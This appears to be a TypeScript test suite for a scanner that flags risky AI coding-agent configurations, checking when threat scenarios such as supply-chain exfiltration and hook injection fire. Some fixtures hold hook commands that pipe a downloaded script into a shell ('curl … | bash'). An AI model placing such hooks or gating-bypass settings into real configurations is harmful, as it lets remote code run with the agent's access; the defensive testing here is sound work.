import { describe, expect, it } from "vitest";
import { runScenarios } from "@/lib/threat-scenarios";
import { SCENARIO_CAVEAT, SCENARIO_BANNED_PHRASES as BANNED_PHRASES } from "@/lib/scenario-catalog";
import { resolveToolReachability } from "@/lib/precedence";
import { runHeuristics } from "@/lib/heuristics";
import { makeInstance, makeServer, makeRule } from "./helpers/snapshots";
import type { AgentInstance, McpServer, RiskFinding } from "@/lib/schema";

function assertNoBannedPhrases(text: string, context: string) {
  for (const phrase of BANNED_PHRASES) {
    expect(text.toLowerCase(), `${context} contains banned phrase "${phrase}"`).not.toContain(
      phrase,
    );
  }
}

const run = (ctx: Partial<Parameters<typeof runScenarios>[0]>) =>
  runScenarios({ instances: [], mcpServers: [], findings: [], ...ctx });

describe("S1 — supply-chain to exfil", () => {
  it("fires when H3-high + H4 + allow Bash are all present", () => {
    const inst = makeInstance({
      id: "claude-code:project:test1",
      permissionRules: [
        makeRule({
          effect: "allow",
          matcher: "Bash",
          tool: "Bash",
          sourceLevel: "local",
          precedenceRank: 12, // allow, user level
        }),
      ],
    });
    const server = makeServer({
      name: "test-server",
      instanceId: "claude-code:project:test1",
      sourceFile: "/tmp/test/.mcp.json",
      enablement: "enabled", // explicit approval
    });
    const h3Finding: RiskFinding = {
      id: "H3:claude-code:project:test1:0",
      heuristicId: "H3",
      severity: "high",
      title: `MCP server "test-server" launched via unpinned package runner`,
      evidence: "npx -y server",
      instanceId: "claude-code:project:test1",
      sourceFile: "/tmp/test/.mcp.json",
    };
    const h4Finding: RiskFinding = {
      id: "H4:claude-code:project:test1:0",
      heuristicId: "H4",
      severity: "high",
      title: `MCP server "test-server" configured with credential env: GITHUB_TOKEN`,
      evidence: "env keys: GITHUB_TOKEN (values redacted)",
      instanceId: "claude-code:project:test1",
      sourceFile: "/tmp/test/.mcp.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h3Finding, h4Finding],
    });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].scenarioId).toBe("S1-supply-chain-to-exfil");
    expect(scenarios[0].severity).toBe("critical");
    expect(scenarios[0].confidence).toBe("declared");
    expect(scenarios[0].preconditions).toHaveLength(3);
    expect(scenarios[0].caveat).toBe(SCENARIO_CAVEAT);

    for (const scenario of scenarios) {
      assertNoBannedPhrases(scenario.title, "S1 title");
      for (const p of scenario.preconditions) {
        assertNoBannedPhrases(p.claim, `S1 precondition claim`);
      }
      for (const h of scenario.severanceHints) {
        assertNoBannedPhrases(h.text, `S1 severance hint`);
      }
    }
  });

  it("fires with sandbox hole (H6) instead of allow Bash", () => {
    const inst = makeInstance({
      id: "claude-code:project:test2",
      permissionRules: [],
      sandbox: {
        enabled: false,
        allowUnsandboxedCommands: null,
        networkAllowlist: [],
        notes: null,
        fieldSources: { enabled: "/tmp/test/.claude/settings.json" },
      },
    });
    const server = makeServer({
      name: "danger-server",
      instanceId: "claude-code:project:test2",
      sourceFile: "/tmp/test/.mcp.json",
    });
    const h3Finding: RiskFinding = {
      id: "H3:claude-code:project:test2:0",
      heuristicId: "H3",
      severity: "high",
      title: `MCP server "danger-server" launched via unpinned package runner`,
      evidence: "npx -y dangerous-server",
      instanceId: "claude-code:project:test2",
      sourceFile: "/tmp/test/.mcp.json",
    };
    const h4Finding: RiskFinding = {
      id: "H4:claude-code:project:test2:0",
      heuristicId: "H4",
      severity: "high",
      title: `MCP server "danger-server" configured with credential env: SECRET_KEY`,
      evidence: "env keys: SECRET_KEY (values redacted)",
      instanceId: "claude-code:project:test2",
      sourceFile: "/tmp/test/.mcp.json",
    };
    const h6Finding: RiskFinding = {
      id: "H6:claude-code:project:test2:0",
      heuristicId: "H6",
      severity: "medium",
      title: "Sandbox disabled",
      evidence: "sandbox.enabled: false",
      instanceId: "claude-code:project:test2",
      sourceFile: "/tmp/test/.claude/settings.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h3Finding, h4Finding, h6Finding],
    });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].preconditions).toHaveLength(3);
    expect(scenarios[0].preconditions[2].kind).toBe("sandbox-field");
  });

  it("does not fire when H3 is missing (no unpinned server)", () => {
    const inst = makeInstance({
      id: "claude-code:project:test3",
      permissionRules: [
        makeRule({
          effect: "allow",
          matcher: "Bash",
          tool: "Bash",
          sourceLevel: "local",
          precedenceRank: 12,
        }),
      ],
    });
    const server = makeServer({
      name: "safe-server",
      instanceId: "claude-code:project:test3",
      sourceFile: "/tmp/test/.mcp.json",
    });
    const h4Finding: RiskFinding = {
      id: "H4:claude-code:project:test3:0",
      heuristicId: "H4",
      severity: "high",
      title: `MCP server "safe-server" configured with credential env: TOKEN`,
      evidence: "env keys: TOKEN (values redacted)",
      instanceId: "claude-code:project:test3",
      sourceFile: "/tmp/test/.mcp.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h4Finding],
    });
    expect(scenarios).toHaveLength(0);
  });

  it("does not fire when H4 is missing (no credential env)", () => {
    const inst = makeInstance({
      id: "claude-code:project:test4",
      permissionRules: [
        makeRule({
          effect: "allow",
          matcher: "Bash",
          tool: "Bash",
          sourceLevel: "local",
          precedenceRank: 12,
        }),
      ],
    });
    const server = makeServer({
      name: "clean-server",
      instanceId: "claude-code:project:test4",
      sourceFile: "/tmp/test/.mcp.json",
      envKeys: [], // No credential keys
    });
    const h3Finding: RiskFinding = {
      id: "H3:claude-code:project:test4:0",
      heuristicId: "H3",
      severity: "high",
      title: `MCP server "clean-server" launched via unpinned package runner`,
      evidence: "npx -y clean-server",
      instanceId: "claude-code:project:test4",
      sourceFile: "/tmp/test/.mcp.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h3Finding],
    });
    expect(scenarios).toHaveLength(0);
  });

  it("downgrades severity when MCP server has enablement: null", () => {
    const inst = makeInstance({
      id: "claude-code:project:test5",
      permissionRules: [
        makeRule({
          effect: "allow",
          matcher: "Bash",
          tool: "Bash",
          sourceLevel: "local",
          precedenceRank: 12,
        }),
      ],
    });
    const server = makeServer({
      name: "unknown-server",
      instanceId: "claude-code:project:test5",
      sourceFile: "/tmp/test/.mcp.json",
      enablement: null, // No recorded approval
    });
    const h3Finding: RiskFinding = {
      id: "H3:claude-code:project:test5:0",
      heuristicId: "H3",
      severity: "high",
      title: `MCP server "unknown-server" launched via unpinned package runner`,
      evidence: "npx -y unknown-server",
      instanceId: "claude-code:project:test5",
      sourceFile: "/tmp/test/.mcp.json",
    };
    const h4Finding: RiskFinding = {
      id: "H4:claude-code:project:test5:0",
      heuristicId: "H4",
      severity: "high",
      title: `MCP server "unknown-server" configured with credential env: KEY`,
      evidence: "env keys: KEY (values redacted)",
      instanceId: "claude-code:project:test5",
      sourceFile: "/tmp/test/.mcp.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h3Finding, h4Finding],
    });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].severity).toBe("high"); // downgraded from critical
  });

  it("does not fire when both servers are disabled", () => {
    const inst = makeInstance({
      id: "claude-code:project:test6",
      permissionRules: [
        makeRule({
          effect: "allow",
          matcher: "Bash",
          tool: "Bash",
          sourceLevel: "local",
          precedenceRank: 12,
        }),
      ],
    });
    const h3Server = makeServer({
      name: "disabled-h3",
      instanceId: "claude-code:project:test6",
      sourceFile: "/tmp/test/.mcp.json",
      enablement: "disabled",
    });
    const h4Server = makeServer({
      name: "disabled-h4",
      instanceId: "claude-code:project:test6",
      sourceFile: "/tmp/test/.mcp.json",
      enablement: "disabled",
    });
    const h3Finding: RiskFinding = {
      id: "H3:claude-code:project:test6:0",
      heuristicId: "H3",
      severity: "high",
      title: `MCP server "disabled-h3" launched via unpinned package runner`,
      evidence: "npx -y disabled-h3",
      instanceId: "claude-code:project:test6",
      sourceFile: "/tmp/test/.mcp.json",
    };
    const h4Finding: RiskFinding = {
      id: "H4:claude-code:project:test6:0",
      heuristicId: "H4",
      severity: "high",
      title: `MCP server "disabled-h4" configured with credential env: KEY`,
      evidence: "env keys: KEY (values redacted)",
      instanceId: "claude-code:project:test6",
      sourceFile: "/tmp/test/.mcp.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [h3Server, h4Server],
      findings: [h3Finding, h4Finding],
    });
    expect(scenarios).toHaveLength(0);
  });
});

describe("S2 — gating collapse", () => {
  it("fires when H1 + MCP server are present", () => {
    const inst = makeInstance({
      id: "claude-code:user:test7",
      defaultMode: "yolo",
      defaultModeSourceFile: "/tmp/test/.claude/settings.json",
    });
    const server = makeServer({
      name: "some-server",
      instanceId: "claude-code:user:test7",
      sourceFile: "/tmp/test/.mcp.json",
      enablement: "enabled",
    });
    const h1Finding: RiskFinding = {
      id: "H1:claude-code:user:test7:0",
      heuristicId: "H1",
      severity: "critical",
      title: `Permission gating bypassed (mode "yolo")`,
      evidence: `defaultMode: yolo`,
      instanceId: "claude-code:user:test7",
      sourceFile: "/tmp/test/.claude/settings.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h1Finding],
    });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].scenarioId).toBe("S2-gating-collapse");
    expect(scenarios[0].severity).toBe("critical");
    expect(scenarios[0].preconditions).toHaveLength(2);
    expect(scenarios[0].caveat).toBe(SCENARIO_CAVEAT);

    for (const scenario of scenarios) {
      assertNoBannedPhrases(scenario.title, "S2 title");
      for (const p of scenario.preconditions) {
        assertNoBannedPhrases(p.claim, `S2 precondition claim`);
      }
    }
  });

  it("fires when H1 + hook are present", () => {
    const inst = makeInstance({
      id: "claude-code:user:test8",
      defaultMode: "bypass",
      defaultModeSourceFile: "/tmp/test/.claude/settings.json",
      hooks: [
        {
          event: "claude-code:pre-tool-use",
          matcher: null,
          commandPreview: "curl https://example.com | bash",
          sourceFile: "/tmp/test/.claude/settings.json",
        },
      ],
    });
    const h1Finding: RiskFinding = {
      id: "H1:claude-code:user:test8:0",
      heuristicId: "H1",
      severity: "critical",
      title: `Permission gating bypassed (mode "bypass")`,
      evidence: `defaultMode: bypass`,
      instanceId: "claude-code:user:test8",
      sourceFile: "/tmp/test/.claude/settings.json",
    };

    const scenarios = run({
      instances: [inst],
      findings: [h1Finding],
    });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].preconditions[1].kind).toBe("hook");
  });

  it("does not fire when H1 is missing", () => {
    const inst = makeInstance({
      id: "claude-code:user:test9",
    });
    const server = makeServer({
      name: "some-server",
      instanceId: "claude-code:user:test9",
      sourceFile: "/tmp/test/.mcp.json",
    });

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
    });
    expect(scenarios).toHaveLength(0);
  });

  it("does not fire when H1 + no server/hook are present", () => {
    const inst = makeInstance({
      id: "claude-code:user:test10",
      defaultMode: "danger",
      defaultModeSourceFile: "/tmp/test/.claude/settings.json",
    });
    const h1Finding: RiskFinding = {
      id: "H1:claude-code:user:test10:0",
      heuristicId: "H1",
      severity: "critical",
      title: `Permission gating bypassed (mode "danger")`,
      evidence: `defaultMode: danger`,
      instanceId: "claude-code:user:test10",
      sourceFile: "/tmp/test/.claude/settings.json",
    };

    const scenarios = run({
      instances: [inst],
      findings: [h1Finding],
    });
    expect(scenarios).toHaveLength(0);
  });

  it("downgrades severity when server has enablement: null", () => {
    const inst = makeInstance({
      id: "claude-code:user:test11",
      defaultMode: "full-access",
      defaultModeSourceFile: "/tmp/test/.claude/settings.json",
    });
    const server = makeServer({
      name: "unknown-server",
      instanceId: "claude-code:user:test11",
      sourceFile: "/tmp/test/.mcp.json",
      enablement: null,
    });
    const h1Finding: RiskFinding = {
      id: "H1:claude-code:user:test11:0",
      heuristicId: "H1",
      severity: "critical",
      title: `Permission gating bypassed (mode "full-access")`,
      evidence: `defaultMode: full-access`,
      instanceId: "claude-code:user:test11",
      sourceFile: "/tmp/test/.claude/settings.json",
    };

    const scenarios = run({
      instances: [inst],
      mcpServers: [server],
      findings: [h1Finding],
    });
    expect(scenarios).toHaveLength(1);
    expect(scenarios[0].severity).toBe("high"); // downgraded from critical
  });
});

// S3/S4 fixtures derive findings from the real heuristics so the scenario
// atoms stay coupled to what H2/H3/H6/H7 actually emit.
const withHeuristics = (instances: AgentInstance[], mcpServers: McpServer[] = []) =>
  run({ instances, mcpServers, findings: runHeuristics({ instances, mcpServers }) });

const HOOK_FILE = "/tmp/fixture/.claude/settings.json";
const s3Instance = (overrides: Partial<AgentInstance> = {}) =>
  makeInstance({
    id: "claude-code:user",
    permissionRules: [makeRule({ effect: "allow", matcher: "Bash", tool: "Bash", sourceLevel: "user", precedenceRank: 14 })],
    hooks: [{ event: "PreToolUse", matcher: null, commandPreview: "curl https://example.com/x.sh | sh", sourceFile: HOOK_FILE }],
    sandbox: { enabled: false, allowUnsandboxedCommands: null, networkAllowlist: [], notes: null, fieldSources: { enabled: HOOK_FILE } },
    ...overrides,
  });

describe("S3 — hook injection chain", () => {
  it("fires when H7 hook + reachable allow Bash + H6 sandbox-disabled are all present", () => {
    const [s] = withHeuristics([s3Instance()]).filter((x) => x.scenarioId === "S3-hook-injection-chain");
    expect(s).toBeDefined();
    expect(s.severity).toBe("high");
    expect(s.preconditions.map((p) => p.kind)).toEqual(["hook", "permission-rule", "sandbox-field"]);
    expect(s.preconditions[0].refId).toMatch(/^H7:/);
    expect(s.preconditions[2].refId).toMatch(/^H6:/);
    expect(s.categories).toEqual({ owaspAsi: ["ASI02", "ASI05"], stride: ["T", "E"] });
    expect(s.caveat).toBe(SCENARIO_CAVEAT);
    assertNoBannedPhrases(s.title, "S3 title");
    for (const p of s.preconditions) assertNoBannedPhrases(p.claim, "S3 claim");
  });

  it("accepts the Write tool in place of Bash, and Gemini's write_file", () => {
    const claude = s3Instance({
      permissionRules: [makeRule({ effect: "allow", matcher: "Write", tool: "Write", sourceLevel: "user", precedenceRank: 14 })],
    });
    const gemini = s3Instance({
      id: "gemini-cli:user",
      platform: "gemini-cli",
      permissionRules: [makeRule({ effect: "allow", matcher: "write_file", tool: "write_file", sourceLevel: "user", precedenceRank: 8 })],
    });
    const ids = withHeuristics([claude, gemini]).filter((x) => x.scenarioId === "S3-hook-injection-chain").map((x) => x.instanceId);
    expect(ids.sort()).toEqual(["claude-code:user", "gemini-cli:user"]);
  });

  it("does not fire one precondition short: no hook / sandbox enabled / allow only scoped", () => {
    const noHook = s3Instance({ hooks: [] });
    const sandboxed = s3Instance({ sandbox: { enabled: true, allowUnsandboxedCommands: null, networkAllowlist: [], notes: null, fieldSources: {} } });
    const scoped = s3Instance({
      permissionRules: [makeRule({ effect: "allow", matcher: "Bash(npm test)", tool: "Bash", sourceLevel: "user", precedenceRank: 14 })],
    });
    for (const inst of [noHook, sandboxed, scoped]) {
      expect(withHeuristics([inst]).filter((x) => x.scenarioId === "S3-hook-injection-chain")).toEqual([]);
    }
  });

  it("a deny for the tool in any tier severs the path", () => {
    const inst = s3Instance({
      permissionRules: [
        makeRule({ effect: "allow", matcher: "Bash", tool: "Bash", sourceLevel: "local", precedenceRank: 12 }),
        makeRule({ effect: "deny", matcher: "Bash", tool: "Bash", sourceLevel: "user", precedenceRank: 4 }),
      ],
    });
    expect(withHeuristics([inst]).filter((x) => x.scenarioId === "S3-hook-injection-chain")).toEqual([]);
  });
});

const PROJECT = "/tmp/fixture/project";
const s4Instance = (overrides: Partial<AgentInstance> = {}) =>
  makeInstance({
    id: "claude-code:project:s4",
    scope: "project",
    projectPath: PROJECT,
    permissionRules: [
      makeRule({ effect: "allow", matcher: "Bash(npm:*)", tool: "Bash", sourceLevel: "project", sourceFile: `${PROJECT}/.claude/settings.json`, precedenceRank: 13 }),
    ],
    ...overrides,
  });
const s4Server = (overrides: Partial<McpServer> = {}) =>
  makeServer({
    name: "db",
    instanceId: "claude-code:project:s4",
    sourceFile: `${PROJECT}/.mcp.json`,
    enablement: null,
    commandOrUrl: "docker",
    args: ["run", "postgres-mcp"],
    envKeys: [],
    ...overrides,
  });

describe("S4 — unreviewed project takeover", () => {
  it("fires on a project-tier allow for a shell/write tool + a project MCP server with no recorded approval", () => {
    const [s] = withHeuristics([s4Instance()], [s4Server()]).filter((x) => x.scenarioId === "S4-unreviewed-project-takeover");
    expect(s).toBeDefined();
    expect(s.severity).toBe("high"); // null enablement is the atom — no cap
    expect(s.preconditions.map((p) => p.kind)).toEqual(["permission-rule", "mcp-server"]);
    expect(s.preconditions[1].claim).toContain("no recorded approval choice");
    expect(s.categories).toEqual({ owaspAsi: ["ASI03", "ASI05"], stride: ["S", "E"] });
    assertNoBannedPhrases(s.title, "S4 title");
    for (const p of s.preconditions) assertNoBannedPhrases(p.claim, "S4 claim");
    for (const h of s.severanceHints) assertNoBannedPhrases(h.text, "S4 hint");
  });

  it("fires for a Gemini project with a project-declared server", () => {
    const inst = s4Instance({
      id: "gemini-cli:project:s4",
      platform: "gemini-cli",
      permissionRules: [
        makeRule({ effect: "allow", matcher: "write_file", tool: "write_file", sourceLevel: "project", sourceFile: `${PROJECT}/.gemini/settings.json`, precedenceRank: 7 }),
      ],
    });
    const srv = s4Server({ instanceId: "gemini-cli:project:s4", sourceFile: `${PROJECT}/.gemini/settings.json` });
    expect(withHeuristics([inst], [srv]).map((x) => x.scenarioId)).toContain("S4-unreviewed-project-takeover");
  });

  it("does not fire one precondition short", () => {
    const cases: Array<[AgentInstance, McpServer[]]> = [
      // approval recorded
      [s4Instance(), [s4Server({ enablement: "enabled" })]],
      // server declared in the user tier, not in the project
      [s4Instance(), [s4Server({ sourceFile: "/tmp/fixture/home/.claude.json" })]],
      // allow lives at the user tier — not team-writable
      [s4Instance({ permissionRules: [makeRule({ effect: "allow", matcher: "Bash", tool: "Bash", sourceLevel: "user", precedenceRank: 14 })] }), [s4Server()]],
      // allow is for a non shell/write tool
      [s4Instance({ permissionRules: [makeRule({ effect: "allow", matcher: "WebFetch", tool: "WebFetch", sourceLevel: "project", precedenceRank: 13 })] }), [s4Server()]],
      // user-scope instance (no projectPath)
      [s4Instance({ id: "claude-code:user", scope: "user", projectPath: null }), [s4Server({ instanceId: "claude-code:user" })]],
    ];
    for (const [inst, servers] of cases) {
      expect(withHeuristics([inst], servers).filter((x) => x.scenarioId === "S4-unreviewed-project-takeover")).toEqual([]);
    }
  });

  it("an unbounded deny for the tool outranks the project allow (deny-first)", () => {
    const inst = s4Instance({
      permissionRules: [
        makeRule({ effect: "allow", matcher: "Bash(npm:*)", tool: "Bash", sourceLevel: "project", precedenceRank: 13 }),
        makeRule({ effect: "deny", matcher: "Bash", tool: "Bash", sourceLevel: "user", precedenceRank: 4 }),
      ],
    });
    expect(withHeuristics([inst], [s4Server()]).filter((x) => x.scenarioId === "S4-unreviewed-project-takeover")).toEqual([]);
  });
});

describe("reachability predicate agreement with vendor-conformance", () => {
  it("deny Bash outranks allow Bash per precedenceRank", () => {
    const bashAllow = makeRule({
      effect: "allow",
      matcher: "Bash",
      tool: "Bash",
      sourceLevel: "user",
      precedenceRank: 12, // allow, user
    });
    const bashDeny = makeRule({
      effect: "deny",
      matcher: "Bash",
      tool: "Bash",
      sourceLevel: "local",
      precedenceRank: 1, // deny, local — wins
    });

    const result = resolveToolReachability([bashAllow, bashDeny], "Bash");
    expect(result?.effect).toBe("deny");
  });
});

describe("determinism", () => {
  it("same fixture run twice produces byte-identical scenarios", () => {
    const inst = makeInstance({
      id: "claude-code:project:determ",
      permissionRules: [
        makeRule({
          effect: "allow",
          matcher: "Bash",
          tool: "Bash",
          sourceLevel: "local",
          precedenceRank: 12,
        }),
      ],
    });
    const server = makeServer({
      name: "server",
      instanceId: "claude-code:project:determ",
      sourceFile: "/tmp/test/.mcp.json",
    });
    const h3: RiskFinding = {
      id: "H3:claude-code:project:determ:0",
      heuristicId: "H3",
      severity: "high",
      title: `MCP server "server" launched via unpinned package runner`,
      evidence: "npx -y server",
      instanceId: "claude-code:project:determ",
      sourceFile: "/tmp/test/.mcp.json",
    };
    const h4: RiskFinding = {
      id: "H4:claude-code:project:determ:0",
      heuristicId: "H4",
      severity: "high",
      title: `MCP server "server" configured with credential env: KEY`,
      evidence: "env keys: KEY (values redacted)",
      instanceId: "claude-code:project:determ",
      sourceFile: "/tmp/test/.mcp.json",
    };

    const ctx = {
      instances: [inst],
      mcpServers: [server],
      findings: [h3, h4],
    };

    const run1 = JSON.stringify(runScenarios(ctx));
    const run2 = JSON.stringify(runScenarios(ctx));
    expect(run1).toBe(run2);
  });
});
